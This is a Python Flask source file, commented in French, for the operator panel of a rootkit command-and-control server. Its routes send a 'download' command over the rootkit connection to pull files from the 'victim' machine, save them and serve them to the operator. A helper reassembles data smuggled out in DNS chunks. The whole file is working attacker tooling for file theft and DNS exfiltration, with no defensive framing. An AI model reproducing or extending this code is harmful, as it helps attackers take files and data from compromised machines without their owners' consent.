from app import app
import config as cfg
from flask import render_template, redirect, url_for, send_file, session, flash
import os, time
from utils.socket import send_to_server, receive_from_server

# --------------------------------- LISTE DES FICHIERS --------------------------------- #

@app.route('/download')
def download():
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    
    # Liste les fichiers déjà téléchargés en local
    files = os.listdir(cfg.DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

# ---------------------- TÉLÉCHARGER UN FICHIER DEPUIS LA VICTIME ---------------------- #

@app.route('/download/<filename>')
def download_file(filename):
    if not session.get('authenticated'):
        return redirect(url_for('login'))

    try:
        # Demande au rootkit de commencer l'envoi du fichier
        send_to_server(cfg.rootkit_connection, f"download {filename}")

        # Reçoit le contenu déchiffré du fichier
        data = receive_from_server(cfg.rootkit_connection)

        # Sauvegarde dans le dossier downloads/
        local_path = os.path.join(cfg.DOWNLOAD_FOLDER, filename)
        with open(local_path, "wb") as f:
            f.write(data.encode("latin1") if isinstance(data, str) else data)

        # Envoie le fichier au navigateur
        return send_file(local_path, as_attachment=True)

    except Exception as e:
        flash(f"❌ Erreur lors du téléchargement du fichier : {e}")
        return redirect(url_for('download'))

# --------------------------- EXFIL ASSEMBLY (DNS) --------------------------- #

def assemble_exfil(timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL):
    """
    Attend jusqu'à `timeout` secondes pour recevoir tous les chunks DNS
    puis assemble les données exfiltrées.
    """

    start = time.time()

    while True:
        if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
            break
        if time.time() - start > timeout:
            break
        time.sleep(poll)

    if cfg.expected_chunks is not None and len(cfg.exfil_buffer) >= cfg.expected_chunks:
        data = b''.join(cfg.exfil_buffer[i] for i in range(cfg.expected_chunks))
        text = data.decode(errors='ignore')
    else:
        text = ""

    # Reset buffers
    cfg.expected_chunks = None
    cfg.exfil_buffer.clear()
    return text
